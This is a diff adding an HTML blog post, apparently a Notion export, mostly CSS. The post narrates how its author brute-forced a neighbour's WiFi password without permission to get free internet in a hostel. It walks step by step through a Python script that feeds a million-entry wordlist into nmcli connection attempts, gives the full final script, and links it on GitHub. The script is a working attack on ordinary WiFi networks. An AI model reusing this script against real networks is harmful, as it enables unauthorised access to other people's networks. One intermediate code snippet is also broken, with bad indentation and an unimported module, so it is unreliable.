@@ -1,0 +1,713 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>How I hacked/cracked my 1st WiFi network (Part-2)</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="6080d11f-b901-4984-9f6c-5cb54440a026" class="page sans"><header><h1 class="page-title">How I hacked/cracked my 1st WiFi network (Part-2)</h1></header><div class="page-body"><div><blockquote id="8d3cd624-93b9-41f0-a852-da0de768b80a" class="">Any actions and or activities related to the material contained within this Website are solely your responsibility. The misuse of the information on this website can result in criminal charges brought against the persons in question. The authors  will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this website to break the law.</blockquote><blockquote id="d14dde91-b036-46d7-b3c6-b14d73d91a80" class="">Do good. Be Ethical. Happy Hacking</blockquote><p id="edf510f9-1a3e-494a-8e12-5d09203dadbc" class="">
+</p></div><h1 id="07e03fd0-d409-4e3d-9b01-8011ddd384a5" class="">Part-2 how i hacked?</h1><h2 id="43ff86f7-a384-4bd7-bbce-4e0cbaa8b86e" class="">So Let’s continue my story .</h2><p id="61a50a2d-7459-4f01-97c3-a0133651614e" class="">It’s true story of mine 😁</p><p id="02219fdd-5f52-45c0-b599-868ac0ecbea6" class="">When I started learning hacking (5 to 6 months early ) . I didn’t had any WIFI adapter (I don’t have it till now ) and my system is just a i3 7th gen 4Gb ram laptop (Till now ) plus i didn’t had any WIFI in of my hostel . As you know we need to download vm for practice and the ISO and zip files are huge (1 GB to 20 GB) and my daily data limit was just 2 GB.  So the last option was just hack someone’s WIFI . But i didn’t had WIFI adapter for hacking with method 1 . But I was pretty good at scripting in python . So I just made a script that auto put password through terminal and  brute force it till it got the right password and I hacked my 1st WIFI in this way it took around 19 min to get the password because the WIFI password was week . Then i just started using it but as I cracked the WIFI with 5GHz so I faced some issue like the range of 5GHz is less in compere to 2.4GHz and most important my phone doesn’t support 5GHz . So l done some for it …. </p><p id="fa326a7e-d6b3-4d8f-9515-2d92377fb5fe" class="">Let’s start the way …</p><h2 id="e9b8d568-1b3e-4526-a97a-c9ae882a6c87" class="">Step-1 (Learning the commend )</h2><p id="87edcd2d-23c9-4d5d-aa3b-a98db4d7f7a1" class="">So at that time I had recently switched to Linux (Ubuntu) . Linux users know that there is commend for every work n Linux so i just searched it how to connect to WiFi with commend line and I got it.</p><pre id="3e5a9c6d-606b-4c48-872e-53d9fd3fa32e" class="code code-wrap"><code>sudo nmcli d wifi connect {wifiname} password {word} ifname {intearface}</code></pre><p id="05ad358f-fc67-4e1d-bcc6-2db75b1da97b" class="">So after this i just used my python skill to automate this .</p><h2 id="ee5fded1-b5a5-471b-a351-83c7dbbf0603" class="">Step-2 (Scripting)</h2><p id="cc7691bb-71e7-437a-9d5a-28bc34dbf781" class="">So let me explain how I wrote my code and how it’s work.</p><h3 id="200d6ebb-3646-420a-8461-3cd7368e792d" class="">Importing</h3><p id="3020213f-38df-4e3d-ad0c-1b19404c0f23" class="">So to run commands we need to import os module .</p><pre id="82412668-535d-4374-ac35-7ae03e3f6eab" class="code code-wrap"><code>import os</code></pre><h3 id="1a63ca76-4005-4e5c-a0b2-61136f12c5ec" class="">Scanning for networks</h3><p id="6fa53094-f6ce-48ec-8b56-491e410e01b8" class="">So to see all WiFi network around you , you just need a command </p><pre id="6105fb44-970f-477b-959a-a9eb6816d823" class="code code-wrap"><code>sudo nmcli d wifi list ifname {interface}</code></pre><p id="76823cb0-3277-4472-b0e4-03c0655e000a" class="">So it’s just look like </p><figure id="b9623403-23d4-40ea-b020-849c5c28428c" class="image"><a href="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/Untitled.png"><img style="width:879px" src="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/Untitled.png"/></a></figure><p id="bedd9e1c-3c95-46f8-88a0-101e5ea3ede9" class="">So lets add this to code .</p><pre id="ba2ebaec-a6e3-4d50-a0e4-9873bd7e3d9d" class="code code-wrap"><code>import os
+os.system(&quot;sudo nmcli d wifi list ifname wlp2s0 &quot; )</code></pre><h3 id="e5085380-7caf-4eb7-8e0b-226018ac3951" class="">Selecting the network to attack </h3><p id="d910967c-2dd4-4ec1-bf96-1ccdd5671b2b" class="">So now we need to select the network for attack .</p><pre id="f92116bf-a2e1-4511-a9e3-6b44b6ce04b3" class="code code-wrap"><code>import os
+os.system(&quot;sudo nmcli d wifi list ifname wlp2s0 &quot; )
+wifiname=input(&quot;select the wifi you want to bruteforce&quot;)</code></pre><h3 id="d635de10-239a-47df-9f31-5cb49d6ec440" class="">Making list of password </h3><p id="b0baf133-635e-489c-a5d8-c24a8def3e09" class="">Since we need password to attack or brute-force  the password.</p><p id="5d4ce02e-5a12-4c2f-9b6d-2be3ac125d61" class="">So let’s make a password list.</p><p id="094a3b44-d96f-4742-9b1c-8bce45c6064a" class=""> </p><pre id="a042a4ad-dd94-4ddb-93f5-e6d7aa5268e5" class="code code-wrap"><code>password_list=[]
+listfile=open(&quot;wordlists/10-million-password-list-top-1000000.txt&quot;,&quot;r&quot;)
+for fill in listfile:
+        password_list.append(fill.replace(&quot;\n&quot;,&quot;&quot;))</code></pre><p id="a070677c-5ea5-4982-9f78-0c2f99e86a19" class="">so this will all every password from text file to list as well as remove all the blank spaces.</p><p id="21f6a387-c1fd-4e5e-8901-61914963894f" class="">Now the code look like.</p><pre id="5adaed51-e19d-4d81-8e7b-cea6bc80dd6a" class="code code-wrap"><code>import os
+password_list=[]
+os.system(&quot;sudo nmcli d wifi list ifname wlp2s0 &quot; )
+wifiname=input(&quot;select the wifi you want to bruteforce&quot;)
+listfile=open(&quot;wordlists/10-million-password-list-top-1000000.txt&quot;,&quot;r&quot;)
+for fill in listfile:
+        password_list.append(fill.replace(&quot;\n&quot;,&quot;&quot;))</code></pre><h3 id="a66f1dc1-3ca8-4508-85c6-e32965a298a6" class="">Final attack</h3><p id="e86fcf9d-a1ab-447d-bf21-b710c3f56490" class="">So now everything is done now start coding the main function of the code .</p><p id="c74cc311-fe6d-454e-8d2f-eab09852aad1" class="">1st we need to connect it with password from list.</p><pre id="4f6bf40d-518b-4d53-a116-51be9d96ad0a" class="code code-wrap"><code>for word in password_list:
+    print(f&quot;trying {word} as password &quot;)
+    os.system(f&quot;sudo nmcli d wifi connect {wifiname} password {word} ifname wlp2s0&quot;)</code></pre><p id="cc976516-8f00-43c5-93ff-646061d66eab" class="">But how to cheek if the password is right and exit the code at that time .</p><p id="0b87391e-6036-45c8-949d-0a66258d542b" class="">Since if you connect WiFi with wrong password is set an error and a success message on successful connect .</p><figure id="ea7e2313-4051-4093-8626-9bc5af0da770" class="image"><a href="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/Untitled%201.png"><img style="width:799px" src="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/Untitled%201.png"/></a></figure><figure id="4a1253c1-a870-4190-9e02-515db150b8e9" class="image"><a href="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/Untitled%202.png"><img style="width:830px" src="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/Untitled%202.png"/></a></figure><p id="3fbf90bb-b1a4-4d11-91e1-4729b9ff5496" class="">Let’s and this to code.</p><pre id="589d025c-1e15-4b8e-909b-b0a781655a2c" class="code code-wrap"><code>for word in password_list:
+    print(f&quot;trying {word} as password &quot;)
+    os.system(f&quot;sudo nmcli d wifi connect {wifiname} password {word} ifname wlp2s0 &gt; con.txt&quot;)
+    passcheek=open(&quot;con.txt&quot;,&quot;r&quot;)
+    passcheek=passcheek.read()
+             if &quot;successfully&quot; in passcheek:
+                 sys.exit()
+             else:
+                pass</code></pre><p id="ca9a0f2c-362e-4a6f-b34d-824a52d6cd2b" class="">And this is the code with working features .</p><p id="274040c0-8cca-4188-9d89-7e84cc11d53d" class="">The time when it works and i got the password.</p><figure id="26cc0d87-f8cf-4e55-b797-8b8e8b3b35ad" class="image"><a href="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/photo_2022-10-22_03-29-33.jpg"><img style="width:1280px" src="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/photo_2022-10-22_03-29-33.jpg"/></a></figure><p id="e994332f-fe28-4b7b-babb-bd2d46dca7a0" class="">Want to see my happiness 😁 </p><figure id="ec71b3bd-d7fc-4dfd-9c08-d65faa96c758" class="image"><a href="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/photo_2022-10-22_03-29-07.jpg"><img style="width:720px" src="How%20I%20hacked%20cracked%20my%201st%20WiFi%20network%20(Part-2)%206080d11fb90149849f6c5cb54440a026/photo_2022-10-22_03-29-07.jpg"/></a></figure><p id="9ee45049-7beb-4cba-ba79-5418cf037bd3" class="">
+</p><p id="a6dced82-f706-402c-b3b4-af792e322d63" class="">So let’s made it better.</p><h3 id="6ce223b7-7260-4b75-b539-ed3c14a915ea" class="">Final code</h3><p id="503cc9d4-bffa-4d73-827a-7c0bc865d8d8" class="">So this was final code .</p><pre id="7863032d-f6fc-4f8c-b7a7-63e612f1bf40" class="code code-wrap"><code>import os
+os.system(&quot;sudo nmcli d wifi list ifname wlp2s0 &quot; )
+wifiname=input(&quot;select the wifi you want to bruteforce&quot;)
+password_list=[]
+listfile=open(&quot;wordlists/10-million-password-list-top-1000000.txt&quot;,&quot;r&quot;)
+for fill in listfile:
+        password_list.append(fill.replace(&quot;\n&quot;,&quot;&quot;))
+for word in password_list:
+                print(f&quot;trying {word} as password &quot;)
+                os.system(f&quot;sudo nmcli d wifi connect {wifiname} password {word} ifname wlp2s0 &gt; con.txt&quot;)
+                passcheek=open(&quot;con.txt&quot;,&quot;r&quot;)
+                passcheek=passcheek.read()
+                if &quot;successfully&quot; in passcheek:
+                                print(&quot;Password cracked&quot;)
+                                print(f&quot;Password of &#x27;{wifiname}&#x27; is &#x27;{word}&#x27;&quot;)
+                                exit()
+                else:
+                        print(f&quot;{word} was not the password&quot;)
+</code></pre><p id="71bea3a2-427f-4af1-aa22-862d4a117924" class="">I named it as <a href="https://github.com/adarshkrdubay/AKDFI">AKDFI</a> and uploaded it to GitHub  </p><figure id="a2d2a9cc-33ed-44ea-837e-df237d1d54a8"><div class="source">https://github.com/adarshkrdubay/AKDFI</div></figure><p id="668fa2c6-c60c-41aa-830b-c90be3e2f253" class="">And that’s How I hacked/cracked my 1st WiFi network…</p><p id="6862f934-54c0-4618-932e-ee838e72d4d6" class="">
+</p><p id="832cdf10-9e3c-4aa8-9d02-3d5225bcb7c4" class="">Do good. Be Ethical. Happy Hacking </p><p id="bc93b82d-c559-4be7-be30-83c2a5fbe842" class="">
+</p></div></article></body></html>
